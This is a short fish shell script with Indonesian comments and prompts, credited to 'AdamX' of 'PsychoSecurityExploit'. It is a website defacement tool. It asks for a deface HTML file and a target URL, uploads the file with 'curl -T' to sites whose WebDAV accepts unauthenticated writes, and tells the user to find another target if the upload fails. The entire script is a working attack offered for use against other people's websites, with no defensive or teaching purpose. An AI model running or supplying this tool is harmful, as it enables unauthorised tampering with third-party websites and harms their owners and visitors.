#!/usr/bin/fish
# Jangan recode bro ntar error :v
# Tools By AdamX

clear
toilet -f future' TOOLSWEBDAV-V1' | lolcat
echo
echo 'Creator : AdamX'| lolcat
echo 'Team : PsychoSecurityExploit' | lolcat
echo
echo "
Script Ini Berfungsi Untuk Mendeface Website Yang Vuln Terhadap Bug Webdav
" | lolcat
echo
echo 'Example : script.html' | lolcat
echo '_:: Nama Script Deface Kalian ::_' | lolcat
echo
read sc
echo
echo 'Example : https://target.com' | lolcat
echo '_:: Target Web Kalian ::_' | lolcat
echo
read target
echo
echo 'Tunggu Sebentar Sedang Proses ...' | lolcat
sleep 2
echo
echo
curl -T /storage/emulated/0/$sc $target
echo 'Hasil :'$target/$sc | lolcat
echo "
Jika Hasilnya Terdeface Berarti Webnya Vuln Webdav . Jika Tidak , Cari Target Yang Lain :)
" | lolcat
